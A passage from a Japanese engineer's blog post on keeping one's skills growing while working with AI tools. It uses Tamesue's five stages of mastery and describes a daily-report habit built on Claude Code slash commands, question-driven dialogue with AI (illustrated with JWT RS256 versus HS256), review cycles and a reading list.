、熟達していくプロセスには、分野を超えた普遍的な構造があると言います。陸上であれプログラミングであれ、学習のプロセスは同じです。技能と自分のどちらかだけを高めても成長できないと説きます。技能と自分は、切り離すことのできない「ひとつのもの」——つまり人間という総体として捉えるべきだと。この人間総体を高めていくことが、学習なのです。この考え方は、ソフトウェアエンジニアとしても腑に落ちます。プログラミングスキルだけを磨いても、良いエンジニアにはなれません。問題を分解する力、チームで働く力、技術を選ぶ判断力。技能と自分の総体が、エンジニアとしての実力です。為末さんによれば、学習には5つの段階があります。この5段階は「学習がどう進むか」を示す地図です。まず、その地図を見てみましょう。「遊（ゆう）」——学習の入口です。新しい技術に触れて、面白いから触る。効率は求めません。目的もありません。遊びとは主体的であり、面白さを伴い、不規則なもの。このモチベーションの源泉が、学習の入口になります。エンジニアなら、新しいフレームワークを触ってみる。ドキュメントを読む前に動かしてみる。「これ何ができるんだろう」と試す。壊してみる。変なパラメータを渡してみる。遊びが好奇心を育て、好奇心が学習を駆動します。「型（かた）」——基礎を身につける段階です。お手本を真似る。ドキュメント通りに書く。型とは「基盤となる最も基本的なもの」であり、個人差を超えて最も安定している普遍的なものです。型は丸呑みするもの。なぜそうするかはわからなくても、まず形から入ります。エンジニアなら、公式チュートリアルを写経する。ベストプラクティスをそのまま真似る。「なぜこう書くのか」は後回し。まず手が覚えるまで繰り返します。型が身体に入ると、考えなくても書けるようになります。「観（かん）」——構造を理解する段階です。「なぜこの書き方なのか」と問う。「見る」とは「分ける」こと。動作を分けて見ることで、技術を構造化します。ある技能は別の技能に支えられている。その関係性が見えてきます。エンジニアなら、コードの設計意図を読み取る。「この抽象化は何のためか」「このパターンはどこで使えるか」と問う。部分（関数）と全体（システム）の関係が見えます。観ができると、他人のコードから学べるようになります。また、コードを「意味の塊」として捉えられるようになります。初心者が「if文があって、関数呼び出しがあって...」と一行ずつ追う場面で、「これはトークン検証の処理だ」と全体を1つの塊として認識できる。塊で捉えるから、複雑なコードも把握できるのです。「心（しん）」——本質を掴む段階です。見極めた本質を軸に、自分なりに自由に動ける状態。いつでもニュートラルポジションに戻れるから、応用的な技術も試せます。中心を柔らかくつかむと、冒険できるようになります。エンジニアなら、技術の本質を掴んでいる状態です。「認証の本質は信頼の証明だ」とわかれば、JWT でも OAuth でも Session でも、状況に応じて選べます。心を掴むと、新しい技術もすぐ理解できます。また、具体的な事例から抽象的なパターンを抽出できます。「このエラーはnullチェック漏れ」という具体から「外部データは信頼しない」という原則へ昇華する。この抽象化ができると、問題を絞り込む力も育ちます。「Invalid token」というエラーを見て、「トークン生成か検証のどちらかが問題」と可能性を狭められる。原理原則を理解していれば、推論で問題にたどり着けるのです。「空（くう）」——学習の到達点です。制約から解き放たれて、技能が自然な形で表現できる状態。いわゆる「ゾーン」です。論理よりも勘が働く。そしてまた「遊」に戻る。学習は循環します。エンジニアなら、コードが自然に流れ出る状態です。設計を考えなくても、手が正しい方向に動く。深夜のデバッグで「なぜかここが怪しい」と直感が働く。空に達した技能は、意識せずに発揮されます。重要なのは、部分の学習が全体を高めるという構造です。「認証処理」という部分を学ぶと、「Webアプリケーション開発」という全体の質が上がります。そして全体の質が上がると、今度は別の部分——たとえば「データベース設計」——を学ぶ意欲が湧いてきます。部分と全体が相互に作用しながら、エンジニアとしての総体が高まっていく。この循環こそが、成長を楽しめる理由です。ここまでが、学習の地図です。でも、抽象的な説明だけでは実感が湧かないかもしれません。私自身の経験に当てはめてみましょう。以前、新しい技術を学ぶとき、何が起きていたでしょうか。ドキュメントを読む。知らない概念が出てくる。調べる。言葉の意味はわかった。でも、まだ腑に落ちない。実際にコードを書いてみる。動かない。なぜ動かないか考える。仮説を立てる。試す。また動かない。別の仮説を立てる。3時間が経つ。ようやく動いた。「ああ、こういうことか」。次からは同じ間違いをしなくなる。この過程で、学習の段階を登っていました。最初は遊びから入った。動かしてみる。壊してみる。次に型を学んだ。ドキュメントを読み、お手本通りに書いた。型を繰り返すうちに、「なぜ」が見えてきた。観の段階です。より深まると、パターンが見える。心の段階です。そして最後に、考えなくても手が動くようになる。摩擦が、学習を生んでいました。繰り返しが、成長を生んでいました。今は違います。AIに聞く。完璧なコードが返ってくる。動く。終わり。私は遊んでいません。型も知りません。観ることもありません。心を掴めません。当然、空には程遠い。結果は出ました。でも、自分の中に何も残っていません。成果だけが先に行き、自分は置き去りにされました。これがAI時代の問題の核心です。摩擦がないから、学べない。繰り返す機会がないから、成長しない。問題の核心は見えました。では、もう少し細かく見てみましょう。学習の5段階で、AIはどこを加速し、どこを壊しているのでしょうか。AIはどの段階を代替しやすいでしょうか。「型」です。正しい書き方、ベストプラクティス、パターンの適用。AIはこれらを高速に提供してくれます。初心者がいきなり熟練者と同じ「型」を使えるようになる。これ自体は悪くありません。では、AIが壊すのはどこでしょうか。「遊」と「観」です。特に「遊」のダメージは深刻です。「遊」が消えると何が起きるのでしょうか。遊びとは、目的なく触ること。壊してみること。限界を探ること。正解がすぐ手に入る環境では、不規則さ・寄り道・失敗が排除されます。効率を求めると、遊びは最初に切り捨てられます。しかし、遊びは単なる入口ではありません。型や観に進むためのエネルギー源でもあります。なぜでしょうか。「型」を学ぶのは退屈です。ドキュメント通りに書く。お手本を真似る。地味な作業です。この退屈に耐えられるのは、「遊」の段階で「面白い」という感覚を得ているからです。「この技術、面白い。だから、ちゃんと学びたい」。このモチベーションがなければ、「型」の段階で挫折します。「観」も同様です。「なぜこうするのか」と問うのは、好奇心がなければできません。好奇心は「遊」で育ちます。遊びがないと、「なぜ」を問う動機がない。「動くからいい」で終わります。遊びがないと、「面白いから学ぶ」がなくなります。「必要だから学ぶ」だけになる。必要性で駆動される学習は、必要がなくなった瞬間に止まります。遊びが失われると、学習への意欲そのものが枯れるのです。「観」も壊れやすい段階です。「なぜこうするのか」と問う前に、AIが答えを出してしまう。構造を自分で見出すプロセスがスキップされます。答えは知っている。でも、答えに至る道筋が見えない。観る力はどこで育つのでしょうか。自分で構造を発見する経験の中です。AIがその経験を奪います。型を飛ばすと、なぜ応用できないのでしょうか。型は「基盤となる最も基本的なもの」です。基盤がないと、その上に何も建てられません。AIが型を代替してくれると、基盤が自分の中にない。だから、少し変わった状況に対応できないのです。学習はなぜ循環構造なのでしょうか。「空」に達しても、また「遊」に戻ります。新しい領域を学ぶとき、再び遊びから始まる。この循環が止まらない限り、人は成長し続けます。AIが「遊」を奪うと、循環そのものが止まります。「心」と「空」は、そもそも到達しにくくなります。基盤となる「遊」と「観」が欠けているからです。本質を掴むには、周辺を十分に探索している必要があります。無意識に動けるようになるには、意識的に何度も繰り返した経験が必要です。AIは上層を加速しますが、基盤を掘り崩します。思い返せば、私が一番成長したのは「遊んでいた」時期でした。学生時代、深夜にLinuxをいじっていました。「このコマンドに変なオプションを渡したらどうなるんだろう」と試した。システムが壊れた。復旧に3時間かかった。でも、その3時間でファイルシステムの構造を理解しました。教科書を読むより、壊して直す方がずっと早く学べました。社会人になってからも、余裕があるときは遊んでいました。「この機能、公式ドキュメントにはこう書いてあるけど、本当にそうなのか」と検証した。ドキュメントが間違っていることもありました。公式が想定していないパターンを見つけることもありました。遊びは、ドキュメントの外側を教えてくれました。今はどうでしょうか。遊ぶ暇があったら、次のタスクをAIに投げています。効率的です。生産的です。でも、技術との「雑談」がなくなりました。目的のない探索がなくなりました。効率を追求した結果、学習の肥沃な土壌を捨てていたのです。遊びがないと、表面的な理解で終わります。ドキュメントに書いてあることは知っている。でも、書いていないことは知らない。想定外の状況に遭遇したとき、対処できません。遊んでいないから、技術の「手触り」がわからないのです。ここまで、学習の5段階と、AIがそれをどう壊すかを説明しました。問題は見えました。では、どうすればいいのでしょうか。答えは単純です。何がわかっていないのかを、見えるようにする。何が欠けているのか。どこで躓いているのか。それを捕まえる。見えれば、対策が打てます。学習の段階で言えば、自分が「遊」で止まっているのか、「型」が足りないのか、「観」ができていないのか。それを知る必要がある。しかし、AIと効率的に働いていると、自分がどこで止まっているかすら見えない。見えないものは改善できない。だから、見えるようにする仕組みが必要だ。そこで私は、先に触れた日報を本格的に活用することにしました。1週間続けて、衝撃を受けました。自分がこんなにも理解していなかったのか。金曜の夜、その週の日報を見返した。「わからない」と書いた項目を数えてみようと思った。月曜の分から順番に。1、2、3... 10を超えたあたりで、手が止まった。まだ火曜だった。水曜、木曜、金曜と続く。「なぜ」がわからないもの、「本質」が見えないもの。多すぎた。画面を見つめながら、胃のあたりがざわついた。正直、途中で数えるのをやめた。自分は理解の入口にすら立っていなかった。しばらく、椅子に座ったまま動けなかった。これが自分の実力なのか。毎日コードを書いて、PRをマージして、それなりにやっているつもりだった。でも、蓋を開けてみれば、理解の穴だらけだった。恥ずかしさ、情けなさ、少しの怒り。それらの混ざった感情が胸に込み上げてきた。でも、その夜、不思議と眠れた。これは希望でもあったからだ。自分の現状を捕まえさえすれば、次に進める。見えない敵は怖いが、見える敵は対策できる。何より、問題が見えた。見えないまま衰えていくより、ずっといい。だから、日報について詳しく説明したい。なぜ日報が効くのか。どう書けばいいのか。日報がなぜ「記録」以上の意味を持つのか。それを理解するには、日報が何を可視化しているかを知る必要がある。日報は単なるログではない。曖昧さを捕まえるためのセンサーだ。書くことは、なぜ理解を深めるのか。AIと働いていると、違和感は一瞬で消える。「なんかわからないな」と思った次の瞬間、AIに聞いている。違和感を感じている時間がない。日報に「なぜ:」と書こうとすると、その違和感を言語化しなければならない。「何がわからないのか」を言葉にする。この言語化のプロセスで、曖昧だった問題が明確になる。書くことは、理解を深める。なぜなら、書けないことは理解していないことだからだ。その場で書くことに意味はあるのか。ある。学習の起点は「わからなかった点」にある。しかし、「わからなかった」という感覚は、時間とともに薄れる。翌日には忘れている。1週間後には、何がわからなかったかすら思い出せない。日報は、躓きを時間差で消えない形に固定する。その場で書かないと、学習の種が消える。日報は何を可視化しているのか。自分が何をわかっていて、何をわかっていないか。どこで繰り返し躓いているか。どのパターンが苦手か。可視化されて初めて、対策が可能になる。見えないものは改善できない。日報は、見えないものを見えるようにする。なぜ「躓き」が重要なのか。躓きは、成長の種だ。スムーズにできたことからは、何も学べない。躓いたところに、学びがある。日報は、躓きを収集するシステムだ。躓きを記録し、パターンを見つけ、対策を打つ。このサイクルが学習を生む。日報がないと何が起きるのか。躓きが流れていく。同じところで何度も躓く。でも、躓いていることに気づかない。気づかないから、対策も打てない。日報がない状態は、センサーのない飛行だ。どこに向かっているかわからない。何が起きているかわからない。墜落してから、問題に気づく。では、日報には何を書けばいいのか。私がよく使うのは「なぜ:」と「試した:」だ。「なぜ:」——理由がわからなかったことを記録する。「なぜ: この実装パターンを選んだ理由」。表面的な理解で終わらせない。「試した:」——目的のない探索を記録する。「試した: このライブラリ、何ができるんだろう。ドキュメントを読まずに動かしてみた」。好奇心が動いた瞬間を残す。キーワードは自分で決めればいい。「写経:」「本質:」「ハマった:」など、必要に応じて増やせばいい。大事なのは、何がわからなかったかを捕まえること。記録することで、自分の躓きパターンが見えてくる。以前は、労働の中で自然と学んでいた。困難にぶつかり、格闘し、乗り越える。そのプロセスが、理解を深めてくれた。今は違う。AIが困難を消してくれるから、格闘する機会がない。だから、意識的に躓きを記録し、学習の種類を分類する必要がある。日報は、そのための道具だ。ここまでは日報の「考え方」を説明した。では、具体的にどう実装するのか。私はClaude Codeのカスタムslash commandsで日報システムを作った。詳しい実装は以前の記事に書いた。syu-m-5151.hatenablog.comClaude Codeには強力なカスタマイズ機能がある。CLAUDE.mdというMarkdownファイルをプロジェクトルートや~/.claude/に置くと、AIがそれを読み込んで動作を調整する。コーディング規約、プロジェクト固有のルール、よく使うパターンなどを書いておけば、AIがそれを参照しながら作業してくれる。また、~/.claude/commands/にMarkdownファイルを置くと、カスタムslash commandsとして使える。/nippo-addと打てば、日報追加用のプロンプトが実行される。AIを「自分専用の道具」に育てる仕組みだ。私の日報システムは3つのコマンドで構成される。/nippo-add - 作業中にその場で記録する。Issue番号や感情も一緒に書く。後から検索しやすくなる。/nippo-finalize - 1日の終わりに実行。散らばった記録をAIが整理して、読みやすい日報に仕上げる。/nippo-show - 日次・週次のサマリーを表示。繰り返し躓いているパターンを可視化する。コマンドファイルは ~/.claude/commands/ に置く。プロジェクトをまたいで使える。CLAUDE.mdにはプロジェクトの文脈を、commands/には繰り返し使う操作を。この2つで、AIは「汎用ツール」から「自分の相棒」に変わる。/nippo-add #456 JWTの検証ロジック実装開始/nippo-add #456 AIが書いたコード動いた。でもなぜRS256なのかわからない/nippo-add なぜ: RS256とHS256の違い/nippo-add 試した: JWTのペイロードに変なデータを入れたらどうなるかポイントは作業中に記録すること。1日の終わりにまとめて書こうとすると、何をやったか思い出せない。その場で書けば、摩擦がない。「なぜ:」「試した:」などのキーワードを入れておけば、後から抽出しやすい。自分がどこで躓いているか、一目でわかる。キーワードは何でもいい。「ハマった:」「理由:」でも、英語で「why:」でも構わない。大事なのは、自分が後から検索しやすく、学習のパターンを把握できること。正解はない。自分にしっくりくる言葉を見つければいい。日報を見返すと、同じ技術で同じ種類の躓きが繰り返されている。非同期処理では「なぜ」がわからない。エラーハンドリングでは「本質」が見えない。新しいライブラリでは「試した」が足りない。繰り返し出てくるということは、その部分で理解が止まっているということだ。弱点が見える。弱点が見えれば、対策が打てる。日報は、学習のガイドになった。日報のキーワードが学習のトリガーここまで、日報を使って躓きを「記録する」方法を説明した。しかし、記録しただけでは学習は起きない。記録は入口に過ぎない。日報に「なぜ:」「試した:」と書いたら、それは学習のトリガーだ。記録して終わりではない。そのまま次に進まない。徹底的にAIと対話する。なぜ「対話する」なのか。ここが重要だ。キーワードで記録した躓きは、「わかっていない」ということだ。わかっていないことを、わかるようにするには、どうすればいいか。自分で調べてもいい。でも、AIがいる。AIは、わからないことを説明してくれる。問題は、AIの説明を受動的に聞くか、能動的に引き出すか、だ。私のルールは単純だ。これらのキーワードを書いたら、その場で最低10分はAIと対話する。10分で理解できなければ、20分かける。理解できるまでやる。次のタスクには進まない。ただ、ここで重要な反論がある。「10分で理解できるわけがない」という反論だ。確かにそうだ。複雑な概念を10分で完全に理解するのは無理がある。でも、重要なのは「10分という制約を設けること」自体にある。制約があるから、「本当にわからないこと」だけに集中できる。制約がなければ、際限なく調べ続けて、結局何も身につかない。では、具体的にどう「徹底的に対話する」のか。ここが最も重要なところだ。「AIと対話する」と言っても、やり方次第で効果は天と地ほど違う。徹底的に対話する技術「AIと対話する」とは具体的にどういうことか。まず、よくある間違いから見てみよう。AIに「答えをもらう」ことと、AIと「徹底的に対話する」ことは、本質的に違う。答えは受動。対話は能動だ。答えをもらう：「このエラーを直して」→ 直るコードが返ってくる → 動く → 終わり。人間側の思考は、ほぼゼロだ。問題を投げて、解決策を受け取る。コピペする。動く。何も考えていない。徹底的に対話する：「このエラーの原因は何？」→「なぜそうなる？」→「他にも同じパターンはある？」→「どう防げる？」。人間側に思考が発生する。質問を組み立てる段階で、自分が何をわかっていないか考える。答えを聞いて、次の質問を考える。このサイクル全体で、脳が動いている。なぜ「教えて」では足りないのか。「教えて」は丸投げだ。AIは何かを返す。でも、それがあなたに必要な説明かどうかわからない。あなたが何を知っていて、何を知らないか、AIには見えない。だから、的外れな説明が返ってくることもある。説明を引き出す側に何が求められるか。自分の理解の輪郭を先に差し出すことだ。「私はここまでわかっている。でも、ここからがわからない」。この輪郭を示すことで、AIは適切な説明を返せる。そして、輪郭を示す行為自体が、すでに学習だ。自分が何をわかっていないか言語化する。これは思考を整理する作業だ。説明を引き出す行為は、どの段階で人間側の思考を必要とするか。最初から最後までだ。何を聞くか考える。聞いた答えを解釈する。次に何を聞くか決める。答えを自分の文脈に当てはめる。このすべてが、能動的な思考だ。答えをもらうだけなら、受動的でいい。説明を引き出すには、能動的でなければならない。なぜ「自分の言葉で書き直す」ことが理解の判定基準になるのか。AIの言葉をそのまま使えるなら、理解していなくてもコピペできる。自分の言葉に置き換えるには、一度、頭の中で「翻訳」する必要がある。翻訳には理解が必要だ。書き直せない説明は、理解ではない。説明できるとはどういう状態か。因果を辿れる状態だ。「なぜこうなるか」を自分の言葉で説明できる。別の人に質問されても、答えられる。説明できるようになって初めて、その知識は「使える」ようになる。この違いは学習速度にどう影響するか。答えをもらい続けると、学習速度はゼロに近づく。説明を引き出し続けると、学習速度は加速する。同じAIを使っても、使い方で学習効果は天と地ほど違う。最初は恥ずかしかった。「こんな基本的なことも知らないのか」と思われるのが怖かった。でも、AIは笑わない。何度聞いても呆れない。AIは、最高の学習パートナーだ。この発見が、学び方を変えた。ステップ1: 自分の理解を言語化するいきなり「教えて」と聞かない。まず自分が何をわかっていて、何がわからないかを言語化する。RS256とHS256について、私の現在の理解を確認させて。私の理解：- 両方ともJWTの署名アルゴリズム- HS256は「対称鍵」を使う（たぶん）- RS256は「非対称鍵」を使う（たぶん）わからないこと：- なぜRS256の方が「セキュア」と言われるのか- どういう場面でどちらを選ぶべきかこの理解は合ってる？こうすることで、AIは私の理解レベルに合わせた説明をしてくれる。輪郭を示す行為自体が、すでに学習だ。ステップ2: 「なぜ」を3回以上繰り返す表面的な理解で終わらせない。本質に到達するまで「なぜ」を繰り返す。なぜJWTの署名にRS256を使うの？→ 「秘密鍵と公開鍵を分離できるから」なぜ分離する必要があるの？→ 「検証側に秘密鍵を渡さなくて済むから」なぜ検証側に秘密鍵を渡すとまずいの？→ 「サービスが増えると秘密鍵を知る場所が増える。1箇所でも漏洩したら全体が危険になる」3回目の「なぜ」あたりから、本質的な理解が始まる。ここで「逆に、HS256を使うべきケースは？」「RS256のデメリットは？」と逆のケースも聞く。正解だけでなく不正解を知ることで、判断基準が明確になる。ステップ3: 自分の言葉で要約するここまで理解したら、AIの説明をコピペせず、自分の言葉で要約する。/nippo-add 振り返り: RS256 vs HS256 を理解した【本質】- HS256 = 共通鍵。署名も検証も同じ秘密を使う- RS256 = 公開鍵暗号。検証側に秘密を渡さなくて済む【使い分け】- モノリス → HS256で十分- マイクロサービス → RS256一択書き直せなかったら、まだ理解していない。もう一度ステップ1から繰り返す。復習のサイクルここまでで、2つのことを説明した。日報で躓きを記録すること。そして、その躓きについてAIと徹底的に対話すること。記録と対話。この2つで、学習は起きるはずだ。でも、実際にやってみると、これだけでは足りなかった。理解しても、忘れる。日報を書いた。AIと対話した。その場では理解した。「ああ、そういうことか」と納得した。でも1週間後、同じことでまた躓いている。「あれ、これ前にも調べなかったか？」。書いただけでは、脳に定着しない。同じ内容を間隔をあけて復習すると、記憶に残りやすい。だから復習のサイクルを作った。翌朝（5分）：前日の日報を見返す。見返すだけでいい。「ああ、これ昨日引っかかったやつだ」と思い出す。思い出す行為自体が、記憶を強化する。実際にやってみると、面白いことが起きた。朝、コーヒーを淹れながら昨日の日報を開く。「RS256とHS256の違い」という項目を見る。「えーと、RS256は公開鍵暗号で...」と頭の中で再生しようとする。すると、昨日は理解したはずなのに、もう曖昧になっている部分がある。忘れかけているタイミングで思い出すことが、記憶を強化する。これを毎朝やるだけで、定着率が全然違う。週末（30分）：その週の日報をまとめて確認。2回以上出てきた項目は、その場でAIと対話して理解を深める。理解できたらチェックを入れる。ある週末、日報を見返していて気づいた。「非同期処理」という項目が、月曜、水曜、金曜と3回出てきている。3回も「なぜ」がわからないと書いているのに、そのたびに次のタスクに進んでいた。繰り返し出てくるということは、その部分の理解が止まっているということだ。その週末、2時間かけてPromiseとasync/awaitを徹底的に理解した。翌週から、非同期処理で詰まることがなくなった。月末（1時間）：月間の傾向分析。3回以上出てきた項目は、根本的な知識の穴だ。書籍を買って体系的に学ぶ。月末の分析で、自分の弱点のパターンが見えてきた。私の場合、「認証・認可」「データベースの最適化」「インフラ周り」が繰り返し出てくる。これは断片的な理解では対応できない。体系的に学ぶ必要がある。だから、月末に1冊ずつ関連書籍を買うことにした。日報は、次に買うべき本を教えてくれる。学んだことは、忘れる。これは避けられない。忘却は敵ではない。思い出せないことが敵だ。日報は「思い出すためのフック」を作る作業だ。完璧に覚えようとしなくていい。戻れる仕組みを作ればいい。人間は意志を保てない。「毎日復習しよう」と決めても、忙しくなれば忘れる。だから仕組みを作る。日報システムは、学習の意志を外部化したものだ。意志に頼らず、習慣に組み込む。学習時間の設計ここまで、日報の書き方、AIとの対話の仕方、復習のサイクルを説明した。方法論は揃った。しかし、ここで当然の疑問が浮かぶ。「いつやるのか？」だ。日報を書く。復習する。わからないことはAIと対話する。週末にまとめて振り返る。どれも時間がかかる。全部やるのは大変そうだ。正直、私もそう思った。会社によっては、学習時間を労働時間としてカウントしてくれるところもある。成果を出すタイミングと学習するタイミングが違っても、それを認めてくれる環境もある。もしそういう会社にいるなら、堂々と労働時間内で学習すればいい。ただ、認めなければならない現実がある。成果を出す時間と、学習する時間は、同時には起きにくくなった。かつて労働は最高の学習だった。しかし今は違う。AIと協働する効率化されたプロセスの中では、学習に必要な「摩擦」が発生しない。タスクは完了する。成果物は出る。それでも、脳には何も残らない。効率の代償は、成長だった。これは構造的な問題だ。だから私は、一度分けることにした。成果を出す時間と学習する時間を、意識的に。成果を出す時間は、AIと一緒に効率よくタスクを消化する。学習する時間は、AIなしで、あるいはAIと徹底的に対話しながら、理解を深める。分けた上で、日報で再接続する。私の1週間はこうなっている。月曜 6:00-6:30：先週の日報を見返す。躓いている項目の中で、今週取り組むべきものを3つ選ぶ。カレンダーに学習時間をブロックする。「今週はこの3つを理解すれば、来週の開発が楽になるはず」。仮説を立て、検証し、修正する。学習も開発と同じだ。水曜 12:00-12:30：昼休みを使って、月曜に選んだ項目を深掘りする。わからないことをAIに問いかけ、徹底的に対話する時間だ。金曜 6:30-8:30：「素手の時間」。AIなしでコードを書く。「AIがあるのに使わないのは非効率だ」という反論があるだろう。確かに、短期的には非効率だ。でも、AIと働き続けていると、基礎力が衰える。使わない筋肉は、静かに萎える。基礎がわかっていれば、AIの出力を評価できる。基礎が怪しければ、動くまでガチャを回すだけになる。この時間にやることは3つある。日報で見つけた躓きをAIなしで調べる。小さなユーティリティ関数を手書きする。エラーメッセージを自力で読み解く。AIに聞けば5分で済むことを、30分かけてやる。この30分が、理解の深さを変える。最初の金曜日、2時間が永遠に感じた。簡単なはずの処理が書けない。「こんなことも自分でできないのか」と、情けなくなった。でも、2時間が終わったとき、達成感があった。自分の手で書いた。久しぶりの感覚だった。AIなしで書いてみると、「本当にわかっていること」と「AIに頼っていたこと」の境界が明確になる。自分の実力が、残酷なほど見える。見えるからこそ、対策が打てる。土曜 朝30分：週の振り返り。3つの項目は理解できたか。理解できなかったものは、来週に持ち越す。完璧を求めない。7割理解できれば、次に進む。最初は週3時間も取れないと思った。でも、試してみると、この3時間で週の残り37時間の労働効率が上がった。学習は消費ではない。複利で回収できる投資だ。理解が深まると、AIへの指示が的確になる。学習への投資は、労働の効率で回収できる。私の場合、成果を出すことと学ぶことが自然には重ならなくなった。だから意識的に交差点を作っている。日報が教えてくれる「次に学ぶべきこと」ここまで、学習の「方法」を説明した。日報で記録する。わからないことはAIと対話して理解を深める。復習する。学習時間を確保する。これで「どう学ぶか」は揃った。しかし、「何を学ぶか」は、まだ説明していない。時間は限られている。何を優先すべきか。闇雲に学んでも、効率が悪い。答えは、日報の中にある。日報を続けていると、躓きのパターンが見えてくる。同じ項目が繰り返し出てくる。認証。非同期処理。データベース。繰り返し出てくるということは、断片的な理解では足りないということだ。そこで、日報をインプットのガイドにする。月末に日報を見返して、3回以上出てきた項目を特定する。それに関連する学習リソースを選ぶ。日報は「次に何を学ぶべきか」を教えてくれる。私の場合、月に技術書を10冊、非技術書を10冊、合わせて20冊前後読んでいる。しかし、これは極端な例だ。最初は月1冊でも十分効果がある。大事なのは冊数ではなく、日報で見つけた躓きに関連する本を選ぶことだ。書籍の良いところは、最低限のクオリティが担保されていることだ。最高のブログは刺さる。でも、最低のブログを引くこともある。書籍は編集者の目を通っている。時間は有限だから、ハズレを引きたくない。日報で繰り返し出てくる躓きを見て、関連する技術書を選ぶ。書籍だけではない。公式ドキュメントやRFC、OSSのソースコードも読む。二次情報で満足せず、一次情報に戻る習慣。これが理解の深さを決める。使っているライブラリの実装を見ると、設計判断の理由がわかる。上級者向けだが、他社の障害報告書も参考になる。ポッドキャストも意外と効く。特にリモートワーカーにおすすめしたい。ちゃんと聞かなくていい。BGMのように流しておくだけでいい。リモートワークを続けていると、雑談が絶望的に下手になる。下手になると、雑談をしたくなくなる。したくなくなると、技術的なことを気軽に話す機会が減る。機会が減ると、間違った理解を指摘してもらえなくなる。悪循環だ。技術系ポッドキャストを聞いていると、エンジニア同士の会話のリズムが耳に残る。話題の引き出しも増える。Xで信用できるアカウントをフォローしておくのもいい。タイムラインを眺めているだけで、今何が話題になっているかがわかる。しかし、Xは使い方が難しい。今やアテンション・エコノミーのど真ん中で、みんなが揉めている。情報収集のつもりが、気づいたら論争を眺めて時間を溶かしていることがある。意識的に距離を取る必要がある。AIに聞けば答えは返ってくる。でも、体系的な理解は書籍や公式ドキュメントでないと得られない。AIは「この問題の解決策」を教えてくれる。書籍は「なぜその解決策が正しいか」を教えてくれる。AIとの協働で生まれた躓きを、AIの外で埋める。あなたの現在地を見つけるためにここまで、私がやってきたことを説明した。日報で躓きを記録する。AIと徹底的に対話する。復習のサイクルを回す。学習時間を確保する。日報から次に学ぶべきことを見つける。インプットを選ぶ。たくさんあるように見えるかもしれない。全部やる必要はない。でも、何かを始める必要はある。ここまで読んでくれたあなたに、問いかけたい。この1週間を振り返ってみてほしい。AIに聞いて解決したけど、なぜその解決策が正しいのか説明できない問題はなかっただろうか。同じ種類の問題に、何度も遭遇していないだろうか。コードは動いた。でも「なぜ動くのか」を同僚に説明できるだろうか。もし1つでも「怪しい」と感じるものがあれば、それがあなたの躓きだ。今日から日報に書き始めてほしい。日報を1週間続けたら、見返してみてほしい。何が繰り返し出てくるか。認証なのか、非同期処理なのか、データベースなのか。繰り返し出てくるものが、次に学ぶべきことだ。そのとき、インプットを意識的に選んでほしい。体系的に理解したいなら書籍。正確な仕様や実装の判断基準を知りたいなら公式ドキュメントやOSSのソースコード。リモートワーカーならポッドキャストもいい。Xで信用できるアカウントをフォローしておくのも悪くない。日報が「次に何を学ぶべきか」を教えてくれる。インプットは、日報を見て選ぶ。AIに聞けば答えは返ってくる。でも、「なぜその答えが正しいか」を理解するのは、AIの外でやる仕事だ。日報は、その仕事を始める場所を教えてくれる。おわりにここまで、私がやってきたことをすべて説明した。日報、AIとの対話の技術、復習のサイクル、学習時間の設計、インプットの選び方。これらは、私がAI時代に「学ぶ」ために見つけた方法だ。最後に、1つだけ伝えたいことがある。この記事で一番大事なことだ。ここまで読んで、気づいた人もいるだろう。私はCLAUDE.mdに学びを書き込んでいる。プロジェクトの文脈、コーディング規約、過去に得た知見。では、AIは賢くなっているのか。答えはNoだ。AIは何も学んでいない。CLAUDE.mdに書かれた内容は、セッションの最初に読み込まれる。でも、それは「学習」ではない。ただの「入力」だ。AIは前回の会話を覚えていない。経験を蓄積しない。「わからない」を経験しない。AIは、このブログが警告している「学ばない労働者」そのものだ。CLAUDE.mdを充実させれば、AIの出力は変わる。使い込むほど手に馴染む道具にはなる。でも、設定を書いたのは誰か。あなただ。試行錯誤したのは誰か。あなただ。AIが賢くなったように見えるのは、あなたが賢くなったからだ。学習とは、経験を意味に変換する行為だ。これが、この記事を通じて私がたどり着いた核心だ。AIは情報を処理できる。でも、AIにとってそれは「意味」を持たない。人間は違う。経験が意味になる。「あのバグを直した」という経験が、「自分はできる」という自信になる。経験を意味に変換できるのは、人間だけだ。AIと協働しながらも、熟達する主体であり続けるために必要な設計がある。遊びの時間を確保すること。目的のない探索がないと、好奇心が死ぬ。「わからない」状態を意図的に作ること。AIに聞けばすぐわかる。でも、あえて聞かない時間が思考力を維持する。記録を習慣にすること。書かないと忘れる。説明を練習すること。説明できなければ、理解していない。「素手」で戦う時間を持つこと。AIなしでコードを書く時間が、基礎力を維持する。これらに共通するのは、摩擦・記録・言語化だ。摩擦が経験を生む。記録が経験を残す。言語化が経験を意味に変える。AIはこの3つを肩代わりしてくれる。だから楽になる。でも、肩代わりさせると、人間は主体でなくなる。最後に、もう一度聞かせてほしい。あなたは最近、「成長している」と感じているだろうか。もし少しでも不安があるなら、今日から日報を開いてみてほしい。「なぜ:」「試した:」と書いてみてほしい。たった1行、それだけでいい。完璧な日報を書く必要はない。その不完全な1行が、次の1行を呼ぶ。そして、その積み重ねがあなたの脳を取り戻す。3日で挫折するだろう。私自身、何度も挫折した。でも、4日目にまた始めればいい。何度でもやり直せる。完璧に続けることより、何度でも再開できることの方が大事だ。1ヶ月後、あなたは変わっている。同僚に「この実装、どうしてこうしたの？」と聞かれたとき、淀みなく答えられる自分がいる。障害が起きたとき、自分のコードを頭の中でトレースできる自分がいる。日報を見返すと、「なぜ:」で埋まっていた項目が、少しずつ減っている。それが、成長の証だ。あなたの脳は、取り戻せる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考書籍知性の未来―脳はいかに進化し、AIは何を変えるのか―作者:マックス・ベネット新潮社AmazonPLURALITY　対立を創造に変える、協働テクノロジーと民主主義の未来（サイボウズ式ブックス）作者:オードリー・タン,E・グレン・ワイルライツ社Amazon奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazon熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon学びとは何か－〈探究人〉になるために (岩波新書)作者:今井 むつみ岩波書店Amazon学びをやめない生き方入門作者:中原淳,パーソル総合研究所,ベネッセ教育総合研究所テオリアAmazon私たちはどう学んでいるのか: 創発から見る認知の変化 (ちくまプリマー新書 403)作者:鈴木 宏昭筑摩書房Amazonシン読解力―学力と人生を決めるもうひとつの読み方作者:新井 紀子東洋経済新報社Amazon夏蜜柑とソクラテス作者:新井 